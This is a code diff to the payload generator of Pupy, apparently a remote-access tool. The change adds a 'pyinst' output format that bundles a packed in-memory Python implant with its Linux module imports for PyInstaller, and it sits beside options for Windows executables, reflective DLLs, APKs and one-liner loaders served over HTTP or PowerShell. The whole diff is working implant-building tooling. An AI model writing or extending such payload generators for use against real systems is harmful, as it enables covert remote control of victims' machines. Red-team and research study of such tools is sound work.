@@ -7,7 +7,7 @@ import logging, argparse, sys, os.path, re, shlex, random, string, zipfile, tarf
 from pupylib.utils.network import get_local_ip
 from pupylib.utils.term import colorize
 from pupylib.payloads.python_packer import gen_package_pickled_dic
-from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload
+from pupylib.payloads.py_oneliner import serve_payload, pack_py_payload, getLinuxImportedModules
 from pupylib.utils.obfuscate import compress_encode_obfs
 from network.conf import transports, launchers
 from network.lib.base_launcher import LauncherError
@@ -236,6 +236,7 @@ class ListOptions(argparse.Action):
         print "\t- exe_86, exe_x64 : generate PE exe for windows"
         print "\t- dll_86, dll_x64 : generate reflective dll for windows"
         print "\t- py              : generate a fully packaged python file (with all the dependencies packaged and executed from memory), all os (need the python interpreter installed)"
+        print "\t- pyinst          : generate a python file compatible with pyinstaller"
         print "\t- py_oneliner     : same as \"py\" format but served over http to load it from memory with a single command line."
         print "\t- ps1_oneliner    : load pupy remotely from memory with a single command line using powershell."
 
@@ -254,7 +255,7 @@ class ListOptions(argparse.Action):
             print '\n'.join(["\t"+x for x in sc.get_help().split("\n")])
         exit()
 
-PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'py_oneliner', 'ps1_oneliner']
+PAYLOAD_FORMATS=['apk', 'exe_x86', 'exe_x64', 'dll_x86', 'dll_x64', 'py', 'pyinst', 'py_oneliner', 'ps1_oneliner']
 if __name__=="__main__":
     if os.path.dirname(__file__):
         os.chdir(os.path.dirname(__file__))
@@ -331,12 +332,15 @@ if __name__=="__main__":
         if not outpath:
             outpath="pupy.apk"
         get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
-    elif args.format=="py":
+    elif args.format=="py" or args.format=="pyinst":
+        linux_modules = ""
         if not outpath:
             outpath="payload.py"
+        if args.format=="pyinst" : 
+            linux_modules = getLinuxImportedModules()
         packed_payload=pack_py_payload(get_raw_conf(conf))
         with open(outpath, 'wb') as w:
-            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+packed_payload)
+            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
     elif args.format=="py_oneliner":
         packed_payload=pack_py_payload(get_raw_conf(conf))
         i=conf["launcher_args"].index("--host")+1
